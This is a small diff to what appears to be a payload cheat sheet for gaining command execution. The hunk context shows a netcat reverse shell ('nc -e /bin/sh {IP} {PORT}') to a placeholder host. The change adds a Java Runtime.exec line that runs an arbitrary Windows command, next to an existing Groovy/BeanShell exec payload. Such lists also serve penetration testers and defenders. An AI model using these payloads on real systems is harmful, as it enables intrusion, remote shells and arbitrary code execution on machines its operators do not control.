@@ -48,6 +48,7 @@ nc -e /bin/sh {IP} {PORT}
 ### Java
 ```java
 r = Runtime.getRuntime();p = r.exec(["your payload"] as String[]);p.waitFor()
+String[] cmd={"cmd","/C","<cmd>"};Runtime.getRuntime().exec(cmd);
 ```
 
 This payload can also work with `BeanShell` scripts.
